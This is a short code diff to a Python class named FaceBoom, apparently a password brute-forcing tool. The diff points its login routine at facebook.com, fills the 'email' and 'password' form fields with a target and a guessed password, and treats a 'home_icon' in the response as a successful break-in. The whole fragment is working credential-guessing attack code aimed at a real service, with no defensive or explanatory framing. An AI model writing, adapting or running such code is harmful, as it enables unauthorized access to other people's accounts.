@@ -83,9 +83,9 @@ class FaceBoom(object):
     def login(self,target, password):
 
         try:
-            self.br.open("http://masterdir.wapkiz.com/site_login.html")
+            self.br.open("https://facebook.com")
             self.br.select_form(nr=0)
-            self.br.form['text']=target
+            self.br.form['email']=target
             self.br.form['password']= password
             self.br.method ="POST"
             if self.br.submit().get_data().__contains__(b'home_icon'):return  1
